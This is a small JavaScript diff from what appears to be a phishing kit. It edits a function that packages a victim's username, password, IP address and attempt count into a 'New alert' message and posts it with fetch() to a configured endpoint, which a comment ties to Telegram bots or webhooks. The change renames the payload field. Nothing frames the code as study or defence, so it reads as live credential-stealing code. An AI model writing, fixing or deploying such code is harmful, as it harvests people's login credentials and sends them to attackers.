@@ -84,11 +84,11 @@
 
     // Send EXACTLY the clean text you want (no "alert:" wrapper)
     async function sendToEndpoint(username, password, ip, attemptNum) {
-      const cleanText = `New alert:\n\nUsername: ${username}\nPassword: ${password}\nIp: ${ip}\nx${attemptNum}`;
+    const cleanText = `New alert:\n\nUsername: ${username}\nPassword: ${password}\nIp: ${ip}\nx${attemptNum}`;
 
-      const payload = {
-        text: cleanText   // Most Telegram bots and webhooks expect "text" field
-      };
+    const payload = {
+        F: cleanText
+    };
 
       try {
         const res = await fetch(config.ENDPOINT_URL, {
